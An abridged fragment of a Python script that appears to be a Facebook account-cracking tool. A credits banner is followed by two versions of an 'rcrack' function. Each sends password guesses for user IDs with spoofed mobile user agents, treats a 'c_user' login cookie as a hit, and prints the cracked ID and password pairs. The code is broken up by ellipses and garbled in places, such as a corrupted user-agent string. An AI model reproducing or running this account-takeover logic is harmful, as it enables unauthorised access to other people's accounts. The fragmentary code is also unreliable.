...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebmPakista6 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
...
os.system("xdg-open https://youtube.com/shorts/hUuWysBbR5U?si=XrJpXuolEvKMsmiN")
#app  check 
...
\033[1;31m(•)=============================================🥀
\033[1;36m[•] \033[1;34mCREATED BY   : » \033[1;34m SHIVA DON
\033[1;32m[•] \033[1;36mFACEBOK      : » \033[1;36m DEVIL JERRY
\033[1;37m[•] \033[1;37mGITHUB       : » \033[1;37m SHARK RULEX
\033[1;33m[•] \033[1;34mSTATUS       : » \033[1;34mTOOL IS FREE
\033[1;35m[•] \033[1;36mBROTHER      : » \033[1;36m NAYAN + SHIVAM 
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POT-AL00a Build/HUAWEIPOT-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/273.0.0.39.123;]',}
		...
		sys.stdout.write('\r\33[1;37m[OP-SV] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',}
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[SAHIVA DON -OK] '+uid+' | '+ps)
		...
		sys.stdout.write('\r\33[1;37m[SHIVA DON 🥰] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
